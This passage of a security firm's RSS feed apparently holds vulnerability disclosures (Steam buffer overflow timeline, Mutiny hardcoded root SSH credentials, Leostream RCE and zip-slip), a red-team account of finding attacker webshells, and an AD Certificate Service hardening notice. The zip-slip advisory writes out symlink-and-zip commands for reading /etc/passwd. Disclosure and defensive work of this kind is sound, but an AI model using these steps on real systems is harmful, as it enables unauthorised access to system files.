&lt;p&gt;That said, there is another way of mitigating this route of attack if this isn’t an option, though it does not address the underlying buffer overflow vulnerability and thus will not cover possible alternate routes of exploitation. Your Steam installation contains globally writable configuration files that store each Steam user’s saved command line arguments (C:\Program Files (x86)\Steam\userdata\&lt;steamID3&gt;\config\localconfig.vdf). If a Steam user account is predominantly used by a specific local user, you can restrict writability of this file to that user account, preventing another user from being able to overwrite your command line arguments. You could also check the command line parameters via the Steam GUI before launching the game to ensure it is as expected.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Timeline&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;09/01/2021: Buffer overflow submitted for bug bounty, though rejected due to social engineering requirement&lt;/p&gt;
&lt;p&gt;11/01/2021: Attempt to disclose via Valve’s public security email, with no response received&lt;/p&gt;
&lt;p&gt;09/02/2021: Subsequent attempt to disclose, again with no response&lt;/p&gt;
&lt;p&gt;28/08/2022: Revisited the vulnerability and discovered the local privilege escalation route via the configuration file&lt;/p&gt;
&lt;p&gt;29/08/2022: Subsequent bug bounty submission, which was rejected due to claims that a remote code execution exploit of this vulnerability had been discovered and disclosed since&lt;/p&gt;
&lt;p&gt;04/04/2023: CVE requested and plan to publish due to lack of remediation, despite awareness of the issue&lt;/p&gt;
&lt;p&gt;26/04/2023: CVE assigned by MITRE&lt;/p&gt;
&lt;p&gt;23/05/2023: Publication by JUMPSEC&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Butting Heads with a Threat Actor on an Engagement</title>
      <link>//localhost:1313/articles/2023/04/2023-04-17-butting-heads-with-a-threat-actor-on-an-engagement/</link>
      <pubDate>Mon, 17 Apr 2023 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2023/04/2023-04-17-butting-heads-with-a-threat-actor-on-an-engagement/</guid>
      <description>
        
        
        &lt;p&gt;At the time of writing I am enjoying some non-billable time in the wake of a demanding engagement spanning across several months. As such, I thought it would be a good time to write up a war story from a recent project in which we came head to head against genuine and active threat actors whilst on an engagement.&lt;/p&gt;
&lt;p&gt;To set the scene, I am working on a purple team project in which we are to cover both the external and internal estate. This tale comes from the external portion of the engagement and as such my colleague and I are going about our usual external red team attack methodology. During this external phase we identify several instances of servers running a software that will remain unnamed for confidentiality’s sake. I will say that this was a third-party software that is used for Identity Access Management, and it appeared to be used in several environments (pre-prod, production, etc) within the client’s estate.&lt;/p&gt;
&lt;p&gt;We fingerprint the exact version of the technology in-use and find that it is in fact vulnerable and outdated. Specifically, it is vulnerable to an unrestricted file upload vulnerability. As is so often the case, metasploit had created a module for the automated exploitation of this vulnerability - great news! As this is not a covert red team, and therefore getting detected is not an issue, I attempt to exploit the file upload vulnerability using meterpreter and msfvenom. Alas, the exploit fails. Undeterred, I look to manually verify the vulnerability myself as I so often find myself doing when metasploit fails me.&lt;/p&gt;
&lt;p&gt;I find a proof-of-concept script on Github and read through the code. It looks good so I quickly write (steal) a JSP webshell to accompany the script and point the pair at my client’s vulnerable servers. This time, it works. With what feels like ‘too good to be true’ ease I’ve got remote code execution on the production Single Sign On (SSO) and Identity Access Management (IAM) server! As always in these cases I let the client know immediately before digging a little bit deeper.&lt;/p&gt;
&lt;p&gt;When landing on an unknown machine I want to immediately perform some situational awareness. From an external perspective this may look slightly different to internal. Some of the main questions include: What OS/distribution am I using? What user and permissions do I have? Am I domain-joined? Do I have visibility into the internal network?&lt;/p&gt;
&lt;p&gt;I quickly determine these answers and find that I am running as a low-privileged user, on a unix machine, that is not domain-joined. Not as juicy as I originally thought, but this is still the production SSO and IAM box so I am hopeful. At this point I get my first inclination that maybe such a trivial exploit chain may have already been abused. I run an &lt;em&gt;ls&lt;/em&gt; to look for the existence of other webshells beyond just my own.&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_19445&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;663&amp;rdquo;]&lt;figure&gt;
    &lt;img src=&#34;images/1.png&#34; title=&#34;Figure 1&#34; alt=&#34;Output of ’ls’ command&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;Figure 1&lt;/figcaption&gt;
  &lt;/figure&gt; Output of &amp;rsquo;ls&amp;rsquo; command[/caption]&lt;/p&gt;
&lt;p&gt;As you can see it appears that I am in the site root of the server. However, what I do not see is the name of my own webshell (cmd.jsp) meaning that my file must not have been uploaded to the site root, more likely it is in the webroot.&lt;/p&gt;
&lt;p&gt;To find the location of the webroot I simply use my webshell to search for the location of my webshell file name to find where all files uploaded via this exploit would land on the file system. Sure enough, I found the appearance of my webshell in a folder that we will falsely call &lt;em&gt;/home/UserName/AppName/Authenticated.&lt;/em&gt; The natural next step is to list the contents of this directory as seen in the screenshot below.&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_19451&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;265&amp;rdquo;]&lt;figure&gt;
    &lt;img src=&#34;images/2-1.png&#34; title=&#34;Figure 2&#34; alt=&#34;2 1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;Figure 2&lt;/figcaption&gt;
  &lt;/figure&gt; Contents of Webroot[/caption]&lt;/p&gt;
&lt;p&gt;Whilst this was useful, it was listing the files in alphabetical order which made it difficult to process which file could be a malicious JSP file versus one naturally used for webserver installation. I do another &lt;em&gt;ls&lt;/em&gt; command but this time listing the contents of the directory in descending order of date modified. That helps clear things up!&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_19452&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;556&amp;rdquo;]&lt;figure&gt;
    &lt;img src=&#34;images/3-1.png&#34; title=&#34;Figure 3&#34; alt=&#34;3 1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;Figure 3&lt;/figcaption&gt;
  &lt;/figure&gt; Contents sorted by Date Modified[/caption]&lt;/p&gt;
&lt;p&gt;I immediately notice the large number of files that have the exact same last modified date and time on Feb 9th. My assumption is that Feb 9th was when the webserver was installed, as all the installation files share this modification date. This leaves 8 files that have been uploaded in the 21 days since installation. The top entry (cmd.jsp) is my webshell and can be excluded. Judging by the time stamps and similar file names this still leaves several unaccounted for JSP files. Naturally, I did a &lt;em&gt;cat&lt;/em&gt; on those files and sure enough…they were also webshells.&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_19453&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;477&amp;rdquo;]&lt;figure&gt;
    &lt;img src=&#34;images/4-1.png&#34; title=&#34;Figure 4&#34; alt=&#34;4 1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;Figure 4&lt;/figcaption&gt;
  &lt;/figure&gt; Threat Actor Webshells[/caption]&lt;/p&gt;
&lt;p&gt;At this point I know we have stumbled upon something bad. I phone the client and let them know the news whilst I continue trying to attribute some of the webshells. Due to the fact that some of the files had very similar names and were uploaded consecutively I can safely assume that they belong to the same threat actor. When grouping as such, I arrive at the conclusion that there have been 4 threat actors who have exploited this in the last 5 days!&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/5-1.png&#34; title=&#34;5 1&#34; alt=&#34;5 1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;5 1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;This is, of course, not counting any threat actors who had deleted their webshells when not in use like I had done. In the same vein, it is important to bear in mind that this was only one of several appearances of this vulnerable server in the estate.&lt;/p&gt;
&lt;p&gt;I reach out to the client to ask permission to repeat the same process on the other vulnerable instances, but by this point the client has engaged their Managed Detection and Response (MDR) provider who has already begun the digital forensics work of identifying the extent of the damage,  whilst the client’s security team begin working on a patch. I write up a professional document containing all my findings, remediation steps, etc., and hand it over to both parties.&lt;/p&gt;
&lt;p&gt;Later that evening I receive an email saying that the vulnerability has been patched and, thankfully, it appears it was caught before it became too much of an issue. However, the MDR provider did see attempts to jump from the external box to the internal network, and confirmed that the box had been enrolled in a crypto mining bot network to use its resources for crypto mining. All things considered this was a pretty good outcome after the initial shock of compromising such a sensitive system.&lt;/p&gt;
&lt;p&gt;And with that quick turnaround my brief headbutt with a genuine and active threat actor(s) came to an end. It is not every day that you get findings like this but it lit the fire in me to get more exposure to the Incident Response side of things, and the client was happy we’d found and fixed a critical vulnerability in just a handful of hours. Wins all round!&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>&lt;strong&gt;Advisory CVE-2022-37832 - Mutiny Network Monitoring Appliance hardcoded credentials&lt;/strong&gt;</title>
      <link>//localhost:1313/articles/2022/12/2022-12-15-advisory-cve-2022-37832-mutiny-network-monitoring-appliance-hardcoded-credentials/</link>
      <pubDate>Thu, 15 Dec 2022 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2022/12/2022-12-15-advisory-cve-2022-37832-mutiny-network-monitoring-appliance-hardcoded-credentials/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software:&lt;/strong&gt; Mutiny Network Monitoring Appliance&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Affected versions:&lt;/strong&gt; &amp;lt;= 7.2.0-10855&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Vendor page:&lt;/strong&gt; &lt;a href=&#34;https://www.mutiny.com&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;www.mutiny.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CVE Reference:&lt;/strong&gt; CVE-2022-37832&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Published:&lt;/strong&gt; 16/12/2022&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CVSS 3.1 Score:&lt;/strong&gt; 10.0 AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Attack Vector:&lt;/strong&gt; Network&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Credit:&lt;/strong&gt; Ryan Saridar&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;An attacker can log in as root remotely to the appliance via SSH.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Mitigation&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Upgrade to version 7.2.0-10855 onwards to remediate the problem.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Technical details&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Before version 7.2.0-10855, the SSH service allows password login to the appliance. The use of weak, hardcoded root credentials between versions means that an attacker with knowledge of this fixed password can log into the appliance remotely and gain unrestricted access to it. Between version 7.2.0-10788 and up to 7.2.0-10850, key-based authentication was introduced, however password-based authentication was not yet disabled. On the patched version, key-based authentication is enforced.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Timeline&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;05/08/2022: Issue reported to the vendor&lt;/p&gt;
&lt;p&gt;05/08/2022: Vendor acknowledged the issues&lt;/p&gt;
&lt;p&gt;19/08/2022: Vendor fixed the issue&lt;/p&gt;
&lt;p&gt;12/09/2022: CVE number assigned from MITRE&lt;/p&gt;
&lt;p&gt;16/12/2022: Advisory published by JUMPSEC&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Advisory CVE-2021-41550 Leostream Connection Broker - Authenticated Remote Code Execution</title>
      <link>//localhost:1313/articles/2022/01/2022-01-26-advisory-cve-2021-41550-leostream-connection-broker-authenticated-remote-code-execution/</link>
      <pubDate>Wed, 26 Jan 2022 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2022/01/2022-01-26-advisory-cve-2021-41550-leostream-connection-broker-authenticated-remote-code-execution/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software&lt;/strong&gt;: Leostream Connection Broker&lt;br&gt;
&lt;strong&gt;Affected Versions&lt;/strong&gt;: 9.0.40.17&lt;br&gt;
&lt;strong&gt;Vendor page&lt;/strong&gt;: &lt;a href=&#34;https://leostream.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://leostream.com/&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;CVE Reference&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2021-41550&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CVE-2021-41550&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;Published&lt;/strong&gt;: 25/01/2022&lt;br&gt;
&lt;strong&gt;Attack Vector&lt;/strong&gt;: Remote, authenticated&lt;br&gt;
&lt;strong&gt;Credits&lt;/strong&gt;: Andrei Constantin Scutariu, Lenk Ratchakrit Seriamnuai, Andrea Malusardi&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;As the Leostream Connection Broker version: 9.0.40.17 allowed an attacker to upload any content through Third Party Content functionality, it was found that the application allowed the listed filenames below the ability to execute Perl programming language by default on the web application.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Mitigation&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The Leostream has released a patch for this vulnerability, JUMPSEC recommend upgrading the affected versions as soon as possible. Leostream&amp;rsquo;s release notes and advisories can be found &lt;a href=&#34;https://leostream.com/wp-content/uploads/2018/11/Leostream_release_notes.pdf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Technical details&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;For achieving remote code execution, an attacker with administrator access to the application - or access as a custom role allowing TPC uploads - can upload Perl files to be executed server-side. The default web server configuration in use by the web application (which is accessible by downloading the archive at &amp;ldquo;Download Technical Support Package&amp;rdquo; link on the left menu bar from Leostream&amp;rsquo;s website) contained the httpd.conf, which shows that the following filenames can be executed:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;all_back.pl&lt;/li&gt;
&lt;li&gt;clients.pl&lt;/li&gt;
&lt;li&gt;config.pl&lt;/li&gt;
&lt;li&gt;database_error.pl&lt;/li&gt;
&lt;li&gt;error_document.pl&lt;/li&gt;
&lt;li&gt;fastlist.pl&lt;/li&gt;
&lt;li&gt;index.pl&lt;/li&gt;
&lt;li&gt;invite.pl&lt;/li&gt;
&lt;li&gt;license.pl&lt;/li&gt;
&lt;li&gt;logout.pl&lt;/li&gt;
&lt;li&gt;pcoip_broker.pl&lt;/li&gt;
&lt;li&gt;plan.pl&lt;/li&gt;
&lt;li&gt;rest.pl&lt;/li&gt;
&lt;li&gt;rpc.pl&lt;/li&gt;
&lt;li&gt;sam.pl&lt;/li&gt;
&lt;li&gt;saml.pl&lt;/li&gt;
&lt;li&gt;search.pl&lt;/li&gt;
&lt;li&gt;server.pl&lt;/li&gt;
&lt;li&gt;status.pl&lt;/li&gt;
&lt;li&gt;support.pl&lt;/li&gt;
&lt;li&gt;syslog_server.pl&lt;/li&gt;
&lt;li&gt;user.pl&lt;/li&gt;
&lt;li&gt;view.pl&lt;/li&gt;
&lt;li&gt;webquery.pl&lt;/li&gt;
&lt;li&gt;Welcome.pl&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The malicious file will be made available under the /tpc/ directory on the web server. The attacker can then trigger the malicious code execution by visiting the uploaded files.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Timeline&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;10/09/2021: Issue reported to the vendor&lt;br&gt;
10/09/2021: Vendor acknowledged the issues&lt;br&gt;
22/09/2021: CVE number assigned from MITRE&lt;br&gt;
16/10/2021: The security patch was released by Leostream&lt;br&gt;
25/01/2021: Advisory published by JUMPSEC&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Advisory CVE-2021-41551 Leostream Connection Broker - Authenticated Zip Slip</title>
      <link>//localhost:1313/articles/2022/01/2022-01-26-advisory-cve-2021-41551-leostream-connection-broker-authenticated-zip-slip/</link>
      <pubDate>Wed, 26 Jan 2022 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2022/01/2022-01-26-advisory-cve-2021-41551-leostream-connection-broker-authenticated-zip-slip/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software&lt;/strong&gt;: Leostream Connection Broker&lt;br&gt;
&lt;strong&gt;Affected Versions&lt;/strong&gt;: 9.0.40.17&lt;br&gt;
&lt;strong&gt;Vendor page&lt;/strong&gt;: &lt;a href=&#34;https://leostream.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://leostream.com/&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;CVE Reference&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2021-41551&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CVE-2021-41551&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;Published&lt;/strong&gt;: 25/01/2022&lt;br&gt;
&lt;strong&gt;Attack Vector&lt;/strong&gt;: path traversal, authenticated&lt;br&gt;
&lt;strong&gt;Credits&lt;/strong&gt;: Andrei Constantin Scutariu, Lenk Ratchakrit Seriamnuai, Andrea Malusardi&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Leostream Connection Broker 9.0.40.17 allows administrators to conduct directory traversal attacks by uploading a ZIP file that contains a symbolic link.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Mitigation&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The Leostream has released a patch for this vulnerability, JUMPSEC recommend upgrading the affected versions to this new version as soon as possible. Leostream&amp;rsquo;s advice and release notes can be found &lt;a href=&#34;https://leostream.com/wp-content/uploads/2018/11/Leostream_release_notes.pdf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Technical details&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;For achieving local file inclusion, an attacker with administrator access to the application - or access as a custom role allowing TPC uploads - can upload zip files to be extracted in the web server directory. The attackers uploaded zip file should be created with a symbolic link by executing “ln -s /etc/passwd passwd”, which can then be zipped using “zip &amp;ndash;symlink -r upload.zip passwd” to create the archive. After supplying the zip file to the application, the archive will be extracted and the target file (in this case /etc/passwd) will be accessible in the /tpc/ directory of the web server, in this example /tpc/passwd.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Timeline&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;10/09/2021: Issue reported to the vendor&lt;br&gt;
10/09/2021: Vendor acknowledged the issues&lt;br&gt;
22/09/2021: CVE number assigned from MITRE&lt;br&gt;
16/10/2021: The security patch was released by Leostream&lt;br&gt;
25/01/2021: Advisory published by JUMPSEC&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Securing against new offensive techniques abusing active directory certificate service</title>
      <link>//localhost:1313/articles/2021/07/2021-07-06-securing-against-new-offensive-techniques-abusing-active-directory-certificate-service/</link>
      <pubDate>Tue, 06 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2021/07/2021-07-06-securing-against-new-offensive-techniques-abusing-active-directory-certificate-service/</guid>
      <description>
        
        
        &lt;p&gt;SpecterOps recently released an offensive security research paper that details techniques enabling an adversary to abuse insecure functionality in Active Directory Certificate Service.&lt;/p&gt;
&lt;p&gt;SpecterOps reports that abusing the legitimate functionality of Active Directory Certificate Service will allow an adversary to forge the elements of a certificate to authenticate as any user or administrator in Active Directory. JUMPSEC has highlighted numerous changes that can be made to Active Directory Certificate Service configuration to protect the domain through a defence-in-depth approach.&lt;/p&gt;
&lt;p&gt;We at JUMPSEC wanted to understand the defensive application of this offensive research to pre-emptively defend our clients from these techniques before exploitation is observed in the wild. To do this, we utilised our Active Directory lab and attempted to harden the service to reduce the risk of compromise and limit the ability for an attacker to cause harm.&lt;/p&gt;
&lt;p&gt;In this article, JUMPSEC has documented the most effective and efficient methods we took to implement the broad defensive guidance in SpecterOps research. In our attempts to harden Active Directory Certificate Service, we have identified ways to harden the environment against compromise, and leverage auditing toolkits to make it easier to identify and remediate areas of exposure.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://labs.jumpsec.com/active-directory-certificate-service-defensive-guidance/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Read here for technical extracts&lt;/a&gt;&lt;/strong&gt; or for the full technical guide &lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2021/07/Active-Directory-Certificate-Service-Defensive-Guidance-v1.pdf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;click here&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Article written by Dray Agha, Security Researcher |&lt;/strong&gt; Any questions, comments, or criticisms please drop me a line on: &lt;a href=&#34;https://twitter.com/Purp1eW0lf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Twitter&lt;/a&gt;, &lt;a href=&#34;https://github.com/Purp1eW0lf/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Github&lt;/a&gt;, or &lt;a href=&#34;mailto:dray.agha@jumpsec.com&#34; &gt;Email&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2021/07/Active-Directory-Certificate-Service-Defensive-Guidance-v1.pdf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/Defensive-Guidance-v1-1-pdf.jpg&#34; alt=&#34;Active Directory Certificate Service Defensive Guidance&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

      </description>
    </item>
    
  </channel>
</rss>
